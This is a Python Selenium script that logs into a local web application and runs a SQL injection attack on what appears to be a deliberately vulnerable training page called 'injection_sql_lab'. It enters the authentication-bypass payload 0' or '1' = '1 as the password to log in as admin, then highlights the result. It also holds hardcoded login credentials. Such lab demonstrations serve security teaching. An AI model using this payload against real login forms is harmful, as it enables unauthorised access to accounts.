
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


import time

driver = webdriver.Chrome()

# Navigate to a webpage
driver.maximize_window()
driver.get("http://localhost:8888/login/")

user_field = driver.find_element(By.NAME,"username")
user_field.send_keys("21520726")

password_field = driver.find_element(By.NAME,"password")
password_field.send_keys("571593az")
password_field.send_keys(Keys.RETURN)

driver.implicitly_wait(2)

driver.get("http://localhost:8888/injection_sql_lab")

input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME,"name"))
            )
input.send_keys("admin")

password = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.NAME,"pass"))
            )
password.send_keys("0' or '1' = '1")

password.send_keys(Keys.RETURN)

success = driver.find_element(By.XPATH, "//h4[contains(text(), 'Logged in as:')]")
time.sleep(1)

driver.execute_script("""
    var h4_element = arguments[0];
    arguments[0].style.backgroundColor = 'red'
    var preElement = h4_element.querySelector('pre');
    var text = preElement.textContent;
    var highlightedText = text.replace(/(admin)/g, '<span style="background-color: red;">$1</span>');
    preElement.innerHTML = highlightedText;
""", success)








time.sleep(20)
driver.close()


# Close the browser
driver.quit()